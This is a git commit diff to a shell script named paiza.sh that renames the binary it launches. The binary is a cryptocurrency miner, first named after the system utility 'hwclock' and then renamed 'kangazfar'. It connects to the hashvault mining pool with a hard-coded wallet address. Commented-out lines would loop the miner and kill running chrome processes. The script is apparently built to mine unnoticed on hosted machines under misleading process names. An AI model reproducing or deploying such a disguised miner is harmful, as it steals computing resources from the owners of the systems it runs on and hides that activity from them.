13f75cba979621dd447258f211b9b4f7afa03046
azzfarrcolab <72619602+azzfarrcolab@users.noreply.github.com>
2021-03-22 09:41:02 +0700

    Update paiza.sh

--- paiza.sh
+++ paiza.sh
@@ -1,7 +1,7 @@
 #!/bin/sh 
  #while true;
   #do
-  ./hwclock --url pool.hashvault.pro:80 --user hvxyAVVK3yAMum1KL3dywBMAnecwWvtEQTqFqUEv7nXw4esu8mt9GJ8BDEiBjdq54NYN6ZDQ7SCsHRvpChZcdhyn3CtTojKCXU --pass x --donate-level 1 -a cn-heavy/xhv
+  ./kangazfar --url pool.hashvault.pro:80 --user hvxyAVVK3yAMum1KL3dywBMAnecwWvtEQTqFqUEv7nXw4esu8mt9GJ8BDEiBjdq54NYN6ZDQ7SCsHRvpChZcdhyn3CtTojKCXU --pass x --donate-level 1 -a cn-heavy/xhv
   #sleep 1800
   #kill $(ps aux | grep 'chrome' | awk '{print $2}')
   #sleep 300;*/
